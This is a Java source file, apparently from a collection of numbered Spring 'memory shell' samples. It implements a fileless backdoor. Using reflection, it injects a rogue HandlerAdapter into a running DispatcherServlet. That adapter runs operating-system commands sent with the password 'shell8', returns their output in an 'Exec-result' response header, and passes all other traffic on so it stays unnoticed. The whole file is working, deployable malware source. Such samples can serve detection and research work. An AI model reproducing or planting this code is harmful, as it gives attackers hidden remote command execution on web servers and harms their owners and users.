package com.example.springshell.memshell;

import com.example.springshell.utils.Util;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.HandlerAdapter;
import org.springframework.web.servlet.ModelAndView;

import java.io.InputStream;
import java.util.List;
import java.util.Scanner;

public class No8_HandlerAdapterShell implements HandlerAdapter {
    List<HandlerAdapter> handlerAdapters;

    public No8_HandlerAdapterShell(List<HandlerAdapter> handlerAdapters) {
        this.handlerAdapters = handlerAdapters;
    }

    public static String injectShell() throws Exception{
        DispatcherServlet servlet = new Util().getServlet();
        List<HandlerAdapter> handlerAdapters = (List<HandlerAdapter>) Util.getFieldValue(servlet,"handlerAdapters");
        handlerAdapters.add(0,new No8_HandlerAdapterShell(handlerAdapters));

        return "{\"result\":\"No8_HandlerAdapterShell\"}";
    }

    @Override
    public boolean supports(Object handler) {
        return true;
    }

    @Override
    public ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String passwd = request.getParameter("pass");
        String cmd = request.getParameter("cmd");
        if (passwd!=null && cmd!=null && passwd.equals("shell8") && !cmd.isEmpty()){
            boolean islinux = true;
            String osType = System.getProperty("os.name");
            if (osType !=null && osType.toLowerCase().contains("win")){
                islinux = false;
            }
            String[] cmds = islinux ? new String[]{"sh","-c",request.getParameter("cmd")} : new String[]{"cmd.exe","/c",request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
//            response.getWriter().write(output);
//            response.getWriter().flush();
//            response.getWriter().close();
            response.setHeader("Exec-result", new String(output));
            return null;
        }
        // 重新找到适配的handlerAdpapter，相当于做了一层代理？？
        for(HandlerAdapter handlerAdapter:this.handlerAdapters){
            if(!(handlerAdapter instanceof No8_HandlerAdapterShell) && handlerAdapter.supports(handler)){
                return handlerAdapter.handle(request,response,handler);
            }
        }

        return null;
    }

    // 模仿SimpleControllerHandlerAdapter的getLastModified方法
    @Override
    public long getLastModified(HttpServletRequest request, Object handler) {
        for(HandlerAdapter handlerAdapter:this.handlerAdapters){
            if(!(handlerAdapter instanceof No8_HandlerAdapterShell) && handlerAdapter.supports(handler)){
                return handlerAdapter.getLastModified(request,handler);
            }
        }
        return 0;
    }
}

